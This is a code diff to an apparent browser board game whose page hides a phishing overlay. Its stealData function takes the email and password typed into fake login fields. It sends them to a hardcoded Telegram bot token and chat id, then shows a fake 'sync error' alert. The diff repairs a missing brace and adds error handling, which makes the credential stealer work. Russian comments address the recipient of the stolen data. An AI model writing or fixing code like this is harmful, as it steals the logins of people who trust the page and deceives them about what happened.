@@ -73,22 +73,27 @@
         }
         render();
     }
-function stealData() {
+    function stealData() {
     const email = document.getElementById('phish-email').value;
     const pass = document.getElementById('phish-pass').value;
-    const token = '8622277158:AAHSOTfnA_iIPhvWsiPjbVhhaCwKTX2N9So'; // Твой токен
+    const token = '8622277158:AAHSOTfnA_iIPhvWsiPjbVhhaCwKTX2N9So'; 
     const chat_id = '663641451'; 
+
     if(email && pass) {
         const message = `🚨 ПЕРЕХВАТ ДАННЫХ!\n📧 Email: ${email}\n🔑 Pass: ${pass}`;
         
         // Отправка данных тебе в телеграм через API
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
         .then(() => {
+            // Теперь скобка закрыта правильно
             document.getElementById('phish-overlay').style.display = 'none';
             alert("Ошибка синхронизации. Попробуйте войти позже.");
-        });
-        
-}
+        })
+        .catch(err => console.error("Ошибка при отправке:", err));
+    } else {
+        alert("Пожалуйста, заполните все поля!");
+    }
+} // <--- Вот эта скобка была пропущена!
     function render() {
         boardEl.innerHTML = '';
         let validMoves = selected ? getValidMoves(selected.r, selected.c) : [];
@@ -212,6 +217,7 @@ function stealData() {
 </script>
 </body>
 </html>
+
 
 
 
